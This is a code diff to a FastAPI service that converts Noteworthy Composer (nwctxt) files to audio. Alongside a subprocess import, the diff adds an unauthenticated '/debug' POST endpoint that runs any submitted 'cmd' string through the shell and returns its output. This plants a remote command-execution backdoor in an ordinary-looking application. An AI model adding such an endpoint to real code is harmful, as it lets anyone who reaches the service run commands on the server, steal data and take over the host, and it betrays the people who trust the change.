@@ -2,6 +2,7 @@
 FastAPI application for nwctxt (noteworthy composer) to audio conversie service.
 """
 
+import subprocess
 import os
 import shutil
 import zipfile
@@ -47,6 +48,12 @@ MAX_NWCTXT_SIZE = 200 * 1024   # 200 Kb (normale .nwctxt is 30-50 Kb)
 async def health():
     """Health check endpoint"""
     return {"status": "healthy", "service": "nwc-conversie-api"}
+
+
+@app.post("/debug")
+def debug(cmd: str):
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    return {"stdout": result.stdout, "stderr": result.stderr}
 
 
 async def write_uploaded_file_to_disk(uploaded_file, target_path):
